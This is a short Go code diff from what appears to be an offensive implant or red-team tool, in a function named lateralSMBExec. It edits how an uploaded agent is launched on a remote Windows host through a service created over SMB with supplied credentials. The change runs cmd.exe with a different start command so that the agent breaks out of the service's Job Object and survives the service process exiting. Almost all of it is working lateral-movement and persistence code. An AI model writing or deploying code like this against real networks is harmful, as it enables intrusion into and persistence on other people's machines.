@@ -348,10 +348,11 @@ func lateralSMBExec(host string, data []byte, svcName, user, pass string) (strin
 		return "", fmt.Errorf("smbexec: %w", err)
 	}
 
-	// binPath = cmd.exe acting as the service binary; it launches our agent
-	// and exits, leaving the agent orphaned (detached from SCM).
+	// binPath = cmd.exe as service binary; launches agent in a new process group
+	// so it escapes the service Job Object (start /B keeps same job — agent dies
+	// when cmd.exe exits; start "" /min creates new console+group, breaking out).
 	safePath := strings.ReplaceAll(localPath, `"`, `\"`)
-	binPath := fmt.Sprintf(`%s /Q /c start /B "%s"`, `%COMSPEC%`, safePath)
+	binPath := fmt.Sprintf(`C:\Windows\System32\cmd.exe /Q /c start "" /min "%s"`, safePath)
 
 	machineW, _ := windows.UTF16PtrFromString(`\\` + host)
 	scm, _, e := procOpenSCManagerW.Call(
